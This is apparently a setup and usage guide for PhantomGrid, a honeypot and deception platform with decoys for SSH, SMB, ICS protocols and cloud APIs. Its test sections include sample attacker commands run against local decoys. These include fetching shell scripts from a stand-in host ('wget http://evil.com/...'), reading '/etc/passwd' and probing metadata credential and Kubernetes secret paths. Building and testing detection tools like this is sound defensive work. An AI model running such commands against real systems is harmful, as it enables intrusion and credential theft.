# PhantomGrid — Installation, Configuration & Usage Guide

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Installation](#2-installation)
3. [Configuration](#3-configuration)
4. [Starting the Stack](#4-starting-the-stack)
5. [First-Time Setup](#5-first-time-setup)
6. [Deploying Decoys](#6-deploying-decoys)
7. [Testing Every Honeypot](#7-testing-every-honeypot)
8. [Deception Artifacts](#8-deception-artifacts)
9. [Events & Alerts](#9-events--alerts)
10. [MITRE ATT&CK Mapping](#10-mitre-attck-mapping)
11. [Troubleshooting](#11-troubleshooting)
12. [Architecture Reference](#12-architecture-reference)

---

## 1. Prerequisites

| Tool | Minimum Version | Purpose |
|------|----------------|---------|
| Docker Desktop | 4.x | Container runtime |
| Docker Compose | v2 (bundled with Desktop) | Multi-service orchestration |
| Git | any | Clone the repo |
| 8 GB RAM | — | Kafka + TimescaleDB + all services |
| Ports free | — | See §3 for full port list |

> **Windows users:** Docker Desktop must use the **WSL 2** backend (Settings → General → "Use WSL 2 based engine").

---

## 2. Installation

```bash
# Clone the repository
git clone https://github.com/your-org/phantomgrid.git
cd phantomgrid

# Generate JWT keypair (optional — dev mode uses a shared secret)
make keys

# Build all service images
make build
```

Directory layout after clone:

```
phantomgrid/
├── backend/
│   ├── services/
│   │   ├── api-gateway/       # Reverse proxy + JWT gate
│   │   ├── auth-service/      # Registration, login, MFA
│   │   ├── decoy-manager/     # Decoy + artifact CRUD
│   │   ├── honeypot-engine/   # Protocol handlers
│   │   ├── event-processor/   # Kafka consumer → DB
│   │   ├── alert-engine/      # Rule-based alerting
│   │   ├── analytics/         # Aggregation queries
│   │   ├── mitre-mapper/      # ATT&CK technique mapping
│   │   ├── notifications/     # Email / Slack / webhook
│   │   ├── realtime/          # WebSocket push
│   │   ├── tenant-manager/    # Multi-tenancy
│   │   └── integrations/      # SIEM / third-party
│   ├── shared/                # ORM models, enums, Kafka helpers
│   ├── migrations/            # Alembic migration files
│   └── Dockerfile.migrate
├── frontend/                  # React + Vite + TailwindCSS
├── docker-compose.yml
├── Makefile
└── DOCS.md
```

---

## 3. Configuration

### 3.1 Environment Variables

All defaults are safe for local development. For production, override via a `.env` file in the project root:

```bash
# .env  (create this file — it is git-ignored)

# JWT — use RS256 keys in production (see make keys)
JWT_SECRET=change_me_to_a_32_char_secret_min

# MFA encryption key — must be a valid Fernet key (base64url of 32 bytes)
# Generate: python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
MFA_ENCRYPTION_KEY=ZGV2ZGV2ZGV2ZGV2ZGV2ZGV2ZGV2ZGV2ZGV2ZGV2ZGU=

# Allowed CORS origins (comma-separated for multiple)
CORS_ORIGINS=http://localhost:3000
```

### 3.2 Port Reference

| Port | Protocol | Service |
|------|----------|---------|
| **3000** | TCP | Frontend (React) |
| **8080** | TCP | API Gateway |
| 10020 | TCP | DNP3 honeypot |
| 10021 | TCP | FTP honeypot |
| 10022 | TCP | SSH honeypot |
| 10023 | TCP | Telnet honeypot |
| 10025 | TCP | SMTP honeypot |
| 10102 | TCP | Siemens S7 honeypot |
| 10161 | UDP | SNMP honeypot |
| 10445 | TCP | SMB honeypot |
| 10502 | TCP | Modbus honeypot |
| 11433 | TCP | MS-SQL honeypot |
| 11883 | TCP | MQTT honeypot |
| 12375 | TCP | Docker API honeypot |
| 13306 | TCP | MySQL honeypot |
| 13389 | TCP | RDP honeypot |
| 15353 | UDP | DNS honeypot |
| 15432 | TCP | PostgreSQL honeypot |
| 15683 | UDP | CoAP honeypot |
| 15900 | TCP | VNC honeypot |
| 16379 | TCP | Redis honeypot |
| 16443 | TCP | Kubernetes API honeypot |
| 18080 | TCP | HTTP honeypot |
| 18169 | TCP | AWS Metadata honeypot |

> All honeypot ports use **high numbers** so they don't conflict with real services. Map them to standard ports on a perimeter firewall/router for production deployments.

---

## 4. Starting the Stack

```bash
# Start everything (detached)
make dev

# Run database migrations (required on first start and after updates)
make migrate

# View live logs
make logs

# Stop everything
make stop

# Stop and remove all volumes (full reset)
make clean
```

Wait ~60 seconds on first boot for Kafka and TimescaleDB to become healthy before running `make migrate`.

---

## 5. First-Time Setup

### 5.1 Register a Tenant & Admin User

Open **http://localhost:3000/register** and fill in:

- **Organization name** — e.g. `ACME Corp`
- **Email** — your admin email
- **Password** — minimum 8 characters

This creates a tenant and the first admin user atomically.

### 5.2 Log In

Go to **http://localhost:3000/login** and sign in with the credentials you just created.

You will land on the **Dashboard** showing live counters for events, alerts, and active decoys.

### 5.3 Verify All Services Are Healthy

```bash
docker compose ps
```

Every service should show **Up**. Key ones to confirm:

```
phantomgrid-api-gateway-1     Up
phantomgrid-auth-service-1    Up
phantomgrid-decoy-manager-1   Up
phantomgrid-honeypot-engine-1 Up
phantomgrid-event-processor-1 Up
phantomgrid-alert-engine-1    Up
phantomgrid-postgres-1        Up (healthy)
phantomgrid-kafka-1           Up (healthy)
phantomgrid-redis-1           Up (healthy)
```

---

## 6. Deploying Decoys

Decoys are the active listeners. Each one binds to a port and records interactions.

### 6.1 Create a Decoy

1. Navigate to **Decoys** in the sidebar
2. Click **+ New Decoy**
3. Fill in the form:

   | Field | Description | Example |
   |-------|-------------|---------|
   | Name | Human-readable label | `SSH Prod Bastion` |
   | Type | Protocol to simulate | `SSH` |
   | IP Address | Optional — displayed in the address column | `192.168.1.10` |
   | Port | Port to bind inside the container | `10022` |

4. Click **Create**

### 6.2 Deploy the Decoy

After creating, the decoy is in **draft** state. Click the **▶ Play** button to deploy it.

The honeypot-engine receives the `deploy` lifecycle event via Kafka, starts the listener, and automatically marks the decoy **Active** within a few seconds.

### 6.3 Lifecycle States

```
draft ──▶ deploying ──▶ active ──▶ paused
                                      │
                                      ▼
                                  destroyed
```

| Button | From State | Action |
|--------|-----------|--------|
| ▶ Play | draft | Deploy |
| ⟳ | deploying | Activate (manual override) |
| ⏸ Pause | active | Pause |
| ▶ Resume | paused | Resume |
| 🗑 Delete | any | Destroy |

---

## 7. Testing Every Honeypot

Each section below shows how to trigger events you can verify in the **Events** page.

> **Tip:** Keep the Events page open at `http://localhost:3000/events` while running the tests. It auto-refreshes every 20 seconds.

---

### 7.1 SSH Honeypot (port 10022)

```bash
ssh -p 10022 -o StrictHostKeyChecking=no root@localhost
# Enter any username and password when prompted
# Run some commands: ls, whoami, cat /etc/passwd
# Type: exit
```

**Expected events:** `connection` → `auth_attempt` (with username + password) → `command_executed` (one per command) → `session_closed` (with full transcript)

---

### 7.2 Telnet Honeypot (port 10023)

```bash
telnet localhost 10023
# Login: admin
# Password: admin123
# Commands: ls, cat /proc/mounts, wget http://evil.com/shell.sh
# Type: exit
```

**Expected events:** `connection` → `auth_attempt` → `command_executed` (tagged `iot_malware` if dangerous commands used) → `session_closed`

---

### 7.3 HTTP Honeypot (port 18080)

```bash
# Basic probe
curl http://localhost:18080/

# Admin panel probe
curl http://localhost:18080/admin
curl http://localhost:18080/wp-admin/

# POST login attempt
curl -X POST http://localhost:18080/login \
  -d "username=admin&password=password123"
```

**Expected events:** `http_request` for each request, tagged with path-based intelligence (e.g. `admin_panel_probe`, `wordpress_probe`)

---

### 7.4 FTP Honeypot (port 10021)

```bash
ftp -n localhost 10021
# ftp> user anonymous password@example.com
# ftp> ls
# ftp> get secret.txt
# ftp> quit
```

**Expected events:** `connection` → `auth_attempt` → `command_executed`

---

### 7.5 SMTP Honeypot (port 10025)

```bash
telnet localhost 10025
# EHLO attacker.com
# MAIL FROM:<attacker@evil.com>
# RCPT TO:<ceo@corp.internal>
# DATA
# Subject: Urgent wire transfer
# .
# QUIT
```

**Expected events:** `connection` → `smtp_command` → `email_relay_attempt` (with from/to/subject)

---

### 7.6 DNS Honeypot (port 15353/UDP)

```bash
# Linux/Mac
dig @localhost -p 15353 internal.corp.local A

# Windows
nslookup internal.corp.local 127.0.0.1
```

**Expected events:** `dns_query` with queried hostname captured

---

### 7.7 SNMP Honeypot (port 10161/UDP)

```bash
# Requires net-snmp tools
snmpwalk -v2c -c public localhost:10161 .1.3.6.1.2.1

# Or with snmpget
snmpget -v1 -c private localhost:10161 .1.3.6.1.2.1.1.1.0
```

**Expected events:** `community_string` with the community string captured (public, private, etc.) tagged `credential_capture`

---

### 7.8 Redis Honeypot (port 16379)

```bash
redis-cli -h localhost -p 16379 ping
redis-cli -h localhost -p 16379 INFO
redis-cli -h localhost -p 16379 CONFIG GET *
redis-cli -h localhost -p 16379 KEYS "*"
```

**Expected events:** `connection` → `redis_command` for each command with `recon` tagging

---

### 7.9 MySQL Honeypot (port 13306)

```bash
mysql -h 127.0.0.1 -P 13306 -u root -p
# Enter any password
```

**Expected events:** `connection` → `auth_attempt` with username and password hash captured

---

### 7.10 PostgreSQL Honeypot (port 15432)

```bash
psql -h localhost -p 15432 -U postgres
# Enter any password
```

**Expected events:** `connection` → `auth_attempt` with username captured

---

### 7.11 SMB Honeypot (port 10445)

```bash
# Using smbclient (Linux/Mac)
smbclient //localhost/share -p 10445 -U administrator

# Using Python Impacket
python3 -m impacket.smbclient //localhost -port 10445
```

> `telnet localhost 10445` records a `connection` event only. Full `ntlm_captured` events require a real SMB client that completes the NTLMSSP handshake.

**Expected events:** `connection` → `ntlm_captured` (with username, domain, NTLMv2 hash) → `share_enumeration`

---

### 7.12 VNC Honeypot (port 15900)

```bash
# Using vncviewer
vncviewer localhost:15900

# Using netcat to simulate an RFB client
echo -e "RFB 003.008\n\x02" | nc localhost 15900
```

**Expected events:** `connection` → `auth_attempt` with DES challenge/response captured

---

### 7.13 RDP Honeypot (port 13389)

```bash
# Windows built-in Remote Desktop
mstsc /v:localhost:13389

# Linux
rdesktop localhost:13389
# or
xfreerdp /v:localhost:13389 /u:Administrator /p:Password123
```

**Expected events:** `connection` → `auth_attempt` with username extracted from RDP cookie, NTLMSSP domain/user if NLA was negotiated

---

### 7.14 MS-SQL Honeypot (port 11433)

```bash
# Using sqlcmd (Windows)
sqlcmd -S localhost,11433 -U sa -P Password123

# Using Python
python3 -c "
import socket, struct
s = socket.create_connection(('localhost', 11433))
# Receive PRELOGIN response
data = s.recv(4096)
print('Connected:', len(data), 'bytes received')
s.close()
"
```

**Expected events:** `connection` → `auth_attempt` with username and deobfuscated password

---

### 7.15 Docker API Honeypot (port 12375)

```bash
curl http://localhost:12375/v1.41/version
curl http://localhost:12375/v1.41/containers/json
curl http://localhost:12375/v1.41/images/json
```

**Expected events:** `http_request` tagged `docker_recon`, `container_escape_attempt` for dangerous API calls

---

### 7.16 Kubernetes API Honeypot (port 16443)

```bash
curl -k https://localhost:16443/api/v1/namespaces
curl -k https://localhost:16443/api/v1/secrets
kubectl --insecure-skip-tls-verify --server=https://localhost:16443 get pods -A
```

**Expected events:** `http_request` tagged `k8s_recon`, `secret_access_attempt`

---

### 7.17 AWS Metadata Honeypot (port 18169)

```bash
curl http://localhost:18169/latest/meta-data/
curl http://localhost:18169/latest/meta-data/iam/security-credentials/
curl http://localhost:18169/latest/user-data/
```

**Expected events:** `metadata_access` tagged `cloud_credential_theft` when IAM credentials path is accessed

---

### 7.18 Modbus Honeypot — OT/ICS (port 10502)

```bash
# Using mbpoll
mbpoll localhost -p 10502 -r 1 -c 10

# Using Python pymodbus
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('localhost', port=10502)
c.connect()
print(c.read_holding_registers(0, 10, slave=1))
c.write_register(0, 9999, slave=1)
c.close()
"
```

**Expected events:** `connection` → `ot_command` per function code, tagged `ot_write_attempt` for FC5/FC6/FC15/FC16

---

### 7.19 DNP3 Honeypot — SCADA (port 10020)

```bash
# Using Python dnp3 library or send raw bytes
python3 -c "
import socket
# DNP3 Read All Classes request
pkt = bytes([
    0x05, 0x64,       # Start bytes
    0x14, 0x44,       # Length + Control
    0x01, 0x00,       # Destination: 1
    0xFF, 0xFF,       # Source: 65535
    0x00, 0x00,       # CRC
    0xC0, 0x01,       # App: FIR+FIN + READ
    0x3C, 0x02, 0x06, # Class 1 All
    0x3C, 0x03, 0x06, # Class 2 All
    0x00, 0x00,       # CRC
])
s = socket.create_connection(('localhost', 10020), timeout=5)
s.send(pkt)
print('Response:', s.recv(256).hex())
s.close()
"
```

**Expected events:** `connection` → `ot_command` with function_name (READ, WRITE, COLD_RESTART, etc.) tagged `scada`

---

### 7.20 Siemens S7 Honeypot — PLC (port 10102)

```bash
# Using Python snap7
python3 -c "
import snap7
c = snap7.client.Client()
c.connect('localhost', 0, 1, tcpport=10102)
print('Connected to fake S7 PLC')
# Read DB1 — triggers ot_command event
info = c.get_cpu_info()
c.disconnect()
"

# Or using nmap S7 detection script
nmap -p 10102 --script s7-info localhost
```

**Expected events:** `connection` → `ot_command` with ROSCTR type and function code, tagged `siemens_s7`

---

### 7.21 MQTT Honeypot — IoT (port 11883)

```bash
# Connect and publish (triggers auth_attempt + mqtt_publish)
mosquitto_pub -h localhost -p 11883 \
  -t "factory/sensor/temperature" \
  -m '{"value": 98.6, "unit": "F"}' \
  -u admin -P password123 -i "rogue-device-001"

# Subscribe (triggers mqtt_subscribe)
mosquitto_sub -h localhost -p 11883 \
  -t "#" -u admin -P password123
```

**Expected events:** `connection` → `auth_attempt` (clientId, username, password) → `mqtt_publish` or `mqtt_subscribe`

---

### 7.22 CoAP Honeypot — IoT (port 15683/UDP)

```bash
# Using coap-client
coap-client -m get coap://localhost:15683/.well-known/core
coap-client -m get coap://localhost:15683/config
coap-client -m put coap://localhost:15683/admin -e "reset=true"

# Using Python aiocoap
python3 -c "
import asyncio, aiocoap
async def main():
    ctx = await aiocoap.Context.create_client_context()
    req = aiocoap.Message(code=aiocoap.GET, uri='coap://localhost:15683/credentials')
    resp = await ctx.request(req).response
    print(resp.payload)
asyncio.run(main())
"
```

**Expected events:** `iot_request` per datagram, severity escalates to `high` for `/config`, `/admin`, `/credentials` paths

---

## 8. Deception Artifacts

Artifacts are passive traps planted in your environment. Navigate to **Artifacts** in the sidebar.

### 8.1 Artifact Types

| Type | Purpose | How attacker triggers it |
|------|---------|--------------------------|
| **Lure** | Fake login page or API endpoint | Attacker visits the URL |
| **Bait** | Fake credentials (AWS keys, tokens, passwords) | Attacker uses the credential |
| **Breadcrumb** | Fake config files, bash history, .env | Attacker reads the file and follows it |
| **Honeytoken** | Unique tracking URL | Attacker accesses the URL — fires automatically |

### 8.2 Creating a Honeytoken (Recommended First Test)

1. Go to **Artifacts → + New Artifact**
2. Set:
   - Type: `Honeytoken`
   - Subtype: `URL Token`
   - Name: `Finance Report Q4 Link`
3. Click **Generate & Create**
4. Click **View** on the artifact to see the `trigger_url`
5. Copy the trigger URL and open it in a browser or curl:

```bash
curl http://localhost:8080/api/artifacts/t/<token_id>
```

6. Go to **Events** — you will see a `honeytoken_triggered` critical event within seconds

### 8.3 Planting Bait Credentials

1. Create a **Bait → AWS Access Key**
2. Click **View** then **show** to reveal the secret key
3. Copy the `access_key_id` and `secret_access_key`
4. Plant them in:
   - A decoy `~/.aws/credentials` file
   - A fake Git repository
   - A commented-out config file on a honeypot workstation
5. If an attacker finds and uses them against AWS, it will fail authentication but you can correlate the attempt via your SIEM

### 8.4 Downloading Breadcrumb Files

1. Create a **Breadcrumb → .bash_history**
2. Click **View** — the file preview and **Download** button appear
3. Download and place the file at `/home/sysadmin/.bash_history` on a decoy workstation
4. The file points commands at your honeypot IPs — when the attacker follows the trail, the honeypot records them

---

## 9. Events & Alerts

### 9.1 Events Page

Navigate to **Events**. Columns:

| Column | Description |
|--------|-------------|
| Time | UTC timestamp |
| Protocol | SSH, TELNET, MODBUS, HONEYTOKEN, etc. |
| Event Type | connection, auth_attempt, ot_command, honeytoken_triggered, etc. |
| Severity | info / low / medium / high / critical |
| Source IP | Attacker IP |
| Details | Raw data (username, password, command, transcript) |

**Filter by severity** or **protocol** using the dropdowns. Events auto-refresh every 20 seconds.

### 9.2 Session Replay

Every connection is assigned a `session_id`. All events from the same session share this ID. The final `session_closed` event contains the full command transcript:

```json
{
  "event_type": "session_closed",
  "raw_data": {
    "duration_seconds": 87,
    "command_count": 5,
    "transcript": [
      {"seq": 1, "cmd": "ls -la", "ts": "2026-04-12T11:30:01Z"},
      {"seq": 2, "cmd": "cat /etc/passwd", "ts": "2026-04-12T11:30:10Z"},
      {"seq": 3, "cmd": "wget http://evil.com/payload.sh", "ts": "2026-04-12T11:30:25Z"},
      {"seq": 4, "cmd": "chmod +x payload.sh", "ts": "2026-04-12T11:30:26Z"},
      {"seq": 5, "cmd": "exit", "ts": "2026-04-12T11:32:08Z"}
    ]
  }
}
```

### 9.3 Alerts

The alert engine fires automatically based on three rule types:

| Rule | Trigger | Example |
|------|---------|---------|
| **Simple match** | Single high/critical event | Any `auth_attempt` with credentials |
| **Threshold** | N events from same IP in T seconds | 5+ `auth_attempt` in 60s → brute force |
| **Correlation** | Same IP hits multiple decoys | SSH + Telnet + SMB from same IP |

Navigate to **Alerts** to see firing alerts. Each alert shows:
- Triggering events
- Source IP
- MITRE technique (if mapped)
- Status: New / Investigating / Resolved / Suppressed

---

## 10. MITRE ATT&CK Mapping

Navigate to **MITRE ATT&CK** to see which techniques have been observed.

PhantomGrid automatically maps events to ATT&CK techniques:

| Event | Technique |
|-------|-----------|
| SSH/Telnet `auth_attempt` | T1110 — Brute Force |
| Telnet `command_executed` with `/bin/sh` | T1059 — Command & Scripting Interpreter |
| SSH `download_attempt` | T1105 — Ingress Tool Transfer |
| SMB `ntlm_captured` | T1557 — Adversary-in-the-Middle |
| SNMP `community_string` | T1046 — Network Service Discovery |
| AWS Metadata `iam_credentials` | T1552 — Unsecured Credentials |
| Docker API probe | T1610 — Deploy Container |
| K8s `secret_access_attempt` | T1552.007 — Container API |
| Modbus write (FC5/FC6) | T0855 — Unauthorized Command Message |
| S7 `PLC Stop` (FC 0x29) | T0881 — Service Stop |
| Honeytoken triggered | T1078 — Valid Accounts (use of stolen token) |

---

## 11. Troubleshooting

### Service won't start

```bash
docker compose logs <service-name> 2>&1 | tail -50
```

### No events appearing after connecting

1. Check honeypot-engine picked up the decoy's lifecycle event:
   ```bash
   docker compose logs honeypot-engine | grep lifecycle_event
   ```
2. Confirm the decoy is **Active** in the UI — not Draft
3. Check event-processor for errors:
   ```bash
   docker compose logs event-processor | grep error
   ```
4. Common cause: decoy port in UI doesn't match any exposed port in `docker-compose.yml`

### Foreign key violation on events

```
Key (tenant_id)=(...) is not present in table "tenants"
```

The decoy was created with a hardcoded random tenant ID. Destroy the decoy, recreate it, and deploy — the new lifecycle event will carry the correct tenant ID.

### Migration fails

```bash
# Reset and rerun
make clean
make dev
# Wait 60s for postgres to be healthy
make migrate
```

### ClickHouse exec format error

```bash
# Use the LTS tag instead
# Already fixed in docker-compose.yml — image: clickhouse/clickhouse-server:23.8
docker compose up -d clickhouse
```

### Port already in use

```bash
# Find what's using the port (Windows)
netstat -ano | findstr :10022

# Kill it or change the honeypot port in docker-compose.yml
```

### Stale container after code change

```bash
docker compose build --no-cache <service-name>
docker compose up -d <service-name>
```

---

## 12. Architecture Reference

```
                        ┌─────────────┐
Browser ──────────────▶ │  Frontend   │ :3000
                        │  React/Vite │
                        └──────┬──────┘
                               │ REST
                        ┌──────▼──────┐
                        │ API Gateway │ :8080
                        │ JWT + Rate  │
                        │ Limit + CORS│
                        └──────┬──────┘
              ┌────────────────┼────────────────┐
              │                │                │
       ┌──────▼─────┐  ┌───────▼──────┐  ┌─────▼──────────┐
       │Auth Service│  │Decoy Manager │  │ Event Processor │
       │ login/MFA  │  │CRUD + Artifacts│ │ Kafka consumer │
       └──────┬─────┘  └───────┬──────┘  └─────┬──────────┘
              │                │                │
              └────────────────┼────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │     PostgreSQL      │
                    │  (TimescaleDB pg16) │
                    │  tenants / users    │
                    │  decoys / events    │
                    │  alerts / artifacts │
                    └─────────────────────┘

              Honeypot Engine              Kafka Topics
         ┌──────────────────────┐    ┌──────────────────────┐
         │  Lifecycle consumer  │    │  decoy.lifecycle      │
         │  ─────────────────── │    │  events.raw           │
         │  SSH    :10022       │───▶│  events.enriched      │
         │  Telnet :10023       │    │  alerts.triggered     │
         │  RDP    :13389       │    │  notifications.pending│
         │  MSSQL  :11433       │    └──────────────────────┘
         │  Modbus :10502       │
         │  DNP3   :10020       │    Alert Engine
         │  S7comm :10102       │  ┌──────────────────────┐
         │  MQTT   :11883       │  │  Simple match rules  │
         │  CoAP   :15683/udp   │  │  Threshold rules     │
         │  + 13 more...        │  │  Correlation rules   │
         └──────────────────────┘  └──────────────────────┘
```

### Data Flow for a Honeypot Connection

```
1. Attacker connects to port 10022 (SSH)
2. Honeypot Engine captures: IP, credentials, commands
3. Emits RawEvent → Kafka topic: events.raw
4. Event Processor consumes events.raw:
   - Enriches with GeoIP / threat intel
   - Persists to PostgreSQL events table
   - Publishes to events.enriched
5. Alert Engine consumes events.enriched:
   - Evaluates rule set
   - Creates alert in DB if rule fires
   - Publishes to alerts.triggered
6. Notifications service sends email/Slack/webhook
7. Frontend auto-refreshes Events + Alerts pages
```

### Data Flow for a Honeytoken Trigger

```
1. Attacker visits planted URL: GET /api/artifacts/t/{token_id}
2. API Gateway forwards (no JWT required — public prefix)
3. Decoy Manager looks up artifact by token_id
4. Increments trigger_count + last_triggered_at
5. Emits critical event → Kafka: events.raw
6. Event Processor saves event
7. Alert Engine fires immediately
8. Notifications sent
```
